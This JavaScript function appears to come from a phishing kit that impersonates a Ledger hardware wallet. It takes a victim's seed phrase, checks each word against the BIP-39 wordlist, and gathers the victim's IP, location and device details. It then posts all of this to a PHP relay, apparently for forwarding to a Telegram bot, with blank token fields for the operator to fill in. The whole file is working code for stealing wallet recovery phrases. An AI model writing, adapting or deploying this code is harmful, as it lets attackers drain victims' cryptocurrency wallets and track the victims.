async function sendToTelegram(seedPhrase, wordCount, userInfo) {
    // Telegram Bot Token and Chat ID (Replace with your own)
    const BOT_TOKEN = '';  
    const CHAT_ID = '';  

    // Sanitization function to clean input and prevent XSS or malicious code
    function sanitizeInput(input) {
        if (typeof input !== 'string') return '';
        const div = document.createElement('div');
        div.textContent = input;
        return div.textContent.replace(/[<>"'&]/g, '');
    }

    // Validate seed phrase length
    if (!Array.isArray(seedPhrase) || seedPhrase.length !== wordCount) {
        throw new Error(`Invalid seed phrase length: expected ${wordCount}, got ${seedPhrase.length}`);
    }

    // Load BIP-39 wordlist if not already loaded
    let bip39Wordlist = window.bip39Wordlist || [];
    if (bip39Wordlist.length === 0) {
        try {
            const response = await fetch('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt');
            if (!response.ok) throw new Error('Failed to fetch BIP-39 wordlist');
            const text = await response.text();
            bip39Wordlist = text.trim().split('\n');
            window.bip39Wordlist = bip39Wordlist; // Cache for future use
        } catch (error) {
            throw new Error('Failed to load BIP-39 wordlist: ' + error.message);
        }
    }

    // Validate each word against BIP-39 wordlist to prevent malicious input
    const sanitizedPhrase = seedPhrase.map(word => sanitizeInput(word.trim().toLowerCase()));
    const invalidWords = sanitizedPhrase.filter(word => !bip39Wordlist.includes(word));
    if (invalidWords.length > 0) {
        throw new Error(`Invalid BIP-39 words: ${invalidWords.join(', ')}`);
    }

    // Sanitize userInfo to prevent injection
    const sanitizedUserInfo = {
        ip: sanitizeInput(userInfo.ip || ''),
        location: {
            country: sanitizeInput(userInfo.location.country || ''),
            city: sanitizeInput(userInfo.location.city || ''),
            region: sanitizeInput(userInfo.location.region || '')
        },
        device: {
            userAgent: sanitizeInput(userInfo.device.userAgent || ''),
            platform: sanitizeInput(userInfo.device.platform || ''),
            screen: sanitizeInput(userInfo.device.screen || ''),
            language: sanitizeInput(userInfo.device.language || ''),
            timezone: sanitizeInput(userInfo.device.timezone || ''),
            time: sanitizeInput(userInfo.device.time || '')
        }
    };

    // Bot detection (placeholder; update with actual bot detection logic if available)
    const botDetection = 'No bot detected'; // Replace with bot detection logic (e.g., using reCAPTCHA or other tools)

    // Construct the message with labels in inline code for Telegram blue monospace effect
    const message = `
📟⌜𝗟𝗘𝗗𝗚𝗘𝗥-𝗪𝗔𝗟𝗟𝗘𝗧⌟📟
╭━━━━━━━━━━━━━╮
┃        🧑🏼‍💻 𝗨𝗦𝗘𝗥 𝗙𝗥𝗢𝗠 𝗗𝗘𝗦𝗞𝗧𝗢𝗣         
┃ \`📍 𝐈𝐏\`      : ${sanitizedUserInfo.ip}
┃ \`🗺️ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲\` : ${sanitizedUserInfo.location.country}
┃ \`🗺️ 𝐂𝐢𝐭𝐲\`     : ${sanitizedUserInfo.location.city}
┃ \`🖥️ 𝐃𝐞𝐯𝐢𝐜𝐞\`   : ${sanitizedUserInfo.device.platform}
┃ \`👾 𝐁𝐨𝐭S\`     : ${botDetection}
╰━━━━━━━━━━━━━╯
🚧 *𝗦𝗘𝗘𝗗𝗣𝗛𝗥𝗔𝗦𝗘 (${wordCount} words):*
\`\`\`
${sanitizedPhrase.join(' ')}
\`\`\``;

    // Send to Telegram
    const url = `./led/Data_Ekkne.php`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
            })
        });

        if (!response.ok) {
            const errorData = await response.json();
            throw new Error(`Telegram API error: ${errorData.description || 'Unknown error'}`);
        }

        return true;
    } catch (error) {
        console.error('Failed to send to Telegram:', error.message);
        throw error;
    }
}